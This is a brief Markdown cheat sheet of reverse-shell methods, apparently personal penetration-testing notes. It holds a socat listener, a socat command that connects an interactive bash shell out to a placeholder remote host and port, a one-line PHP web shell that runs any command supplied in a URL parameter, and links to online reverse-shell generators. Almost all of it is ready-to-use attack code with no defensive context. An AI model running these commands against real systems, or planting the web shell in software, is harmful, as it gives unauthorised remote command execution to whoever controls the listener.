# Reverse Shell

## Socat

### Listener

```bash
socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>
```

### Connect

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<RHOST>:<RPORT>
```

## Web shell

### PHP

```php
<?php system($_GET['cmd']); ?>
```

## Links

- [RevShells Online](https://www.revshells.com/)
- [Reverse Shell - Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
